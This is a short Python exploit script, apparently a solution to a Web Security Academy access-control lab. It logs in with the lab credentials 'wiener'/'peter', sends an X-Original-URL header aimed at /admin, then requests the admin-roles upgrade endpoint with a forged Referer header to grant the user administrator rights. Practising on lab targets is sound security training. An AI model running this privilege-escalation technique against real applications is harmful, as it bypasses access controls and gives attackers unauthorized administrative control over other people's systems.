import requests
s = requests.Session()

site = 'ac181f9c1ebcac5e80de1b5f007800e0.web-security-academy.net'

admin_upgrade_url = f'https://{site}/admin-roles/?username=wiener&action=upgrade'
admin_url = f'https://{site}/admin'
upgrade_data = {
    'username' : 'wiener',
    'action' : 'upgrade'
}
login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data, headers = {'X-Original-URL' : '/admin'})

print(resp.text)

resp = s.get(admin_upgrade_url,headers={'referer' : admin_url})
print(resp.text)